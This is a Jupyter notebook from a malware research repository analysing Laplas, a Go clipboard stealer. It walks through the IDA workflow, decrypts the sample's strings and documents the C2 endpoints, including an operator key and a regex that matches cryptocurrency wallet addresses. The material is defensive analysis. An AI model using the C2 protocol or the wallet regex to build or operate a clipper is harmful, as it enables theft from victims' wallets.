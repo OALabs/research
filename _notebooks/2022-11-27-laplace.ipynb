{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "fc08c55a-cd84-4ca5-8703-0cb8b98aaf14",
   "metadata": {},
   "source": [
    "# Laplace Clipper\n",
    "> Taking a look at this GOLang clipboard stealer\n",
    "\n",
    "- toc: true \n",
    "- badges: true\n",
    "- categories: [golang,laplace,python,research,ida,goresym,alphagolang]\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a4fa3195-8a8c-451c-ac8b-9445581e1de6",
   "metadata": {},
   "source": [
    "## Overview\n",
    "\n",
    "![](https://i0.wp.com/blog.cyble.com/wp-content/uploads/2022/11/Figure-3-%E2%80%93-Laplas-Clipper-advertisement-used-by-TA-on-the-dark-web-forum-1.jpg)\n",
    "\n",
    "According to [cyble](https://blog.cyble.com/2022/11/02/new-laplas-clipper-distributed-by-smokeloader/) **laplas** is a clipboard hijacker that is sold openly on forums. This sample of Laplas is written in **GOLang**, but there is also a **.NET** build.\n",
    "\n",
    "According to the same blog the malware calls out to its C2 to get a list of regexes to use for clipboard hijacking.\n",
    "> The malware uses GetRegex() function to get all the regex patterns from the C&C server. This function calls SendRequest() function internally, which forms the below URL that downloads the regex pattern to identify the victim’s cryptocurrency wallet address.\n",
    "`hxxp[:]//clipper[.]guru/bot/regex?key=afc950a4a18fd71c9d7be4c460e4cb77d0bcf29a49d097e4e739c17c332c3a34`\n",
    "\n",
    "## Panel\n",
    "This stealer has poor OPSEC and the panel is openly available on the web at `https://laplas[.]app/`. Potential users are encouraged to create an account and purchase access to the bot. \n",
    "\n",
    "![](https://i.imgur.com/OJ0HQLY.png)\n",
    "\n",
    "The developer also has a telegram channel at `https://t[.]me/LAPLAS_CLIPPER_NEWS`. \n",
    "\n",
    "![](https://i.imgur.com/67MCyWE.png)\n",
    "\n",
    "### Samples\n",
    "Packed: `81e9eefec051e50a819e76fa1ec2f088c2e8c5de677537838193cf6c2e5c7584` [malware bazaar](https://bazaar.abuse.ch/sample/81e9eefec051e50a819e76fa1ec2f088c2e8c5de677537838193cf6c2e5c7584/)\n",
    "Unpacked:`f341ad891d445c745f10b4861a5c273abf7a38a0bd85168e7e6528e6b5c0141d` [malshare](https://malshare.com/sample.php?action=detail&hash=f341ad891d445c745f10b4861a5c273abf7a38a0bd85168e7e6528e6b5c0141d)\n",
    "\n",
    "\n",
    "### References \n",
    "- JoeSandbox extracted c2 `http://clipper.guru/bot/online` [link](https://www.joesandbox.com/analysis/754720/0/html)\n",
    "- [cyble blog describing laplas](https://blog.cyble.com/2022/11/02/new-laplas-clipper-distributed-by-smokeloader/)\n",
    "- [AlphaGolang IDA plugin](https://github.com/SentineLabs/AlphaGolang)\n",
    "- [GoReSym](https://github.com/mandiant/GoReSym)\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a9067bd8-e7d8-42f8-8ee6-15f6f468ae2b",
   "metadata": {},
   "source": [
    "## Analysis\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b30ceb46-d547-4600-bb15-01da3752c93a",
   "metadata": {},
   "source": [
    "### GO Analysis Workflow\n",
    "\n",
    "We are only using IDA 7.5 so we don't have a lot of the fancy GO features in the newer versions of IDA. We are mainly relying on IDA plugins to fix up the GO binary.\n",
    "\n",
    "1. Run AlphaGolang scripts (1) and (2) to label the statically linked GO runtime and library code\n",
    "2. Run GoReSym and imported the results with their IDA script (not sure what this did?)\n",
    "3. Run AlphaGolang script (4) to fix up the string refs ... this only sort of works\n",
    "4. *Optional* mark the `.data` section with the string references as readble only (constant) to force Hex-Rays to show the string literals... we also need to uncheck the `Print only constant string literals` in the Hex-Rays options. This will now show the string refs. [ref](https://hex-rays.com/blog/igors-tip-of-the-week-56-string-literals-in-pseudocode/)\n",
    "5. Strings are not null terminated this means that we need to force the string size manually or IDA will assume a giant blob of ascii text is the string. **There should be a better way** but for now we just made a terrible one-off script.\n",
    "\n",
    "### GO String Formatting\n",
    "Go strings use the following struct.\n",
    "```c\n",
    "struct go_string{\n",
    "    char* string_buff;\n",
    "    DWORD string_len; \n",
    "    \n",
    "}\n",
    "```\n",
    "\n",
    "The following terrible script can be used to manually force the proper string length for the GO strings references in the `.data` section. The `start` and `end` are used to mark the start and end of the GO strings table (barf heuristic to check if it's a legit string or not). This should probably be replaced and integrated into the GO scipts above.\n",
    "\n",
    "```python\n",
    "def make_string(ptr):\n",
    "    start = 0x0069E954\n",
    "    end = 0x006B34FC\n",
    "    str_len = ida_bytes.get_32bit(ptr+4)\n",
    "    str_ptr = ida_bytes.get_32bit(ptr)\n",
    "    if start <= str_ptr < end:\n",
    "        ida_bytes.create_strlit(str_ptr, str_len, STRTYPE_C)\n",
    "\n",
    "for ptr in range(0x0087B804, 0x087CC4F, 4):\n",
    "    make_string(ptr)\n",
    "```\n",
    "\n",
    "### GO Calling Convention and IDA 7.5\n",
    "There is no good way for IDA 7.5 to handle multiple return values (used by GO) in the Hex-Rays decompiler. Though later versions of IDA support a custom `__usercall` notation to handle this. \n",
    "\n",
    "- [Igor’s tip of the week #107: Multiple return values](https://hex-rays.com/blog/igors-tip-of-the-week-107-multiple-return-values/)\n",
    "- [Stack-based return values in down't work in IDA 7.5](https://reverseengineering.stackexchange.com/questions/18305/how-to-specify-stack-based-return-values-in-ida-pro-golang)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dd68f720-8eff-4efc-b37e-0a2de8b66fa7",
   "metadata": {},
   "source": [
    "### Laplas String"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "f758b1b2-e6e8-4946-ab47-6d83906cfa39",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'clipper.guru'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import base64\n",
    "\n",
    "data = 'FxgdBAQRBloTAQYB'\n",
    "data_enc = base64.b64decode(data)\n",
    "out = []\n",
    "key = 0x74\n",
    "\n",
    "for c in data_enc:\n",
    "    out.append(c ^ key)\n",
    "\n",
    "bytes(out)\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "431ea4b9-2563-4a23-95d7-244577bbe9f1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'ace492e9661223449782fcc8096dc6ef6289032d08d03a7b0a92179622c35bdb'\n",
      "b'clipper.guru'\n",
      "b'jicTFBavsm'\n",
      "b'sRMkeBrlXD.pid'\n",
      "b'PNcznLwIMl.exe'\n"
     ]
    }
   ],
   "source": [
    "\n",
    "\n",
    "def decrypt(data, key):\n",
    "    data_enc = base64.b64decode(data)\n",
    "    out = []\n",
    "    for c in data_enc:\n",
    "        out.append(c ^ key)\n",
    "    return bytes(out)\n",
    "\n",
    "\n",
    "\n",
    "print(decrypt('FRcRQE1GEU1CQkVGRkdAQE1DTEYSFxdMRE1CEBdCERJCRkxNREdGEERMEERHFUMWRBVNRkVDTUJGRhdHQRYQFg==',key))\n",
    "print(decrypt('FxgdBAQRBloTAQYB',key))\n",
    "print(decrypt('Hh0XIDI2FQIHGQ==',key))\n",
    "print(decrypt('ByY5HxE2BhgsMFoEHRA=',key))\n",
    "print(decrypt('JDoXDho4Az05GFoRDBE=',key))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "44247540-bb87-4b2c-aec6-183974960239",
   "metadata": {},
   "source": [
    "The first string is the KEY that is used to ID the botnet operator and the second is the the C2 host (the botnet is centrally hosted so encryptiing this seems silly). \n",
    "\n",
    "### C2 URLs\n",
    "\n",
    "#### Regex\n",
    "The regex endpoint is used to pull down a list of regexes used to replace clipboard data.\n",
    "\n",
    "`http[:]//clipper[.]guru/bot/regex?key=ace492e9661223449782fcc8096dc6ef6289032d08d03a7b0a92179622c35bdb` \n",
    "\n",
    "Response\n",
    "```\n",
    "^(?:(1[1-9A-HJ-NP-Za-km-z]{33})|(3[1-9A-HJ-NP-Za-km-z]{33})|(bc1q[023456789acdefghjklmnpqrstuvwxyz]{38,58})|(q[a-z0-9]{41})|(p[a-z0-9]{41})|(L[a-km-zA-HJ-NP-Z1-9]{33})|(M[a-km-zA-HJ-NP-Z1-9]{33})|(ltc1q[a-km-zA-HJ-NP-Z1-9]{38})|(0x[a-fA-F0-9]{40})|(D[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32})|(4[0-9AB][1-9A-HJ-NP-Za-km-z]{93})|(8[0-9AB][1-9A-HJ-NP-Za-km-z]{93})|(r[0-9a-zA-Z]{33})|(t1[a-km-zA-HJ-NP-Z1-9]{33})|(X[1-9A-HJ-NP-Za-km-z]{33})|(ronin:[a-fA-F0-9]{40})|(T[A-Za-z1-9]{33})|(http[s]*:\\/\\/steamcommunity.com\\/tradeoffer\\/new\\/\\?partner=([0-9]+)&token=([a-zA-Z0-9]+))|(tz[1-3][1-9A-HJ-NP-Za-km-z]{33})|(addr1[a-z0-9]+)|(cosmos1[a-z0-9]{38})|(R[a-zA-Z0-9]{33})|([A-Z2-7]{58})|([1-9A-HJ-NP-Za-km-z]{44}))\n",
    "```\n",
    "\n",
    "#### Get\n",
    "The get endpoint is used to get attacker controled data to replace the intercepted clipboard data. The clipboard data is sent in the `address` parameter. \n",
    "\n",
    "`http[:]//clipper[.]guru/bot/get?address=https%3A%2F%2Fsteamcommunity.com%2Ftradeoffer%2Fnew%2F%3Fpartner%3D482147969%26token%3Db&key=ace492e9661223449782fcc8096dc6ef6289032d08d03a7b0a92179622c35bdb`\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f1cd78eb-b9d6-409e-af73-895a0b6eaf8c",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
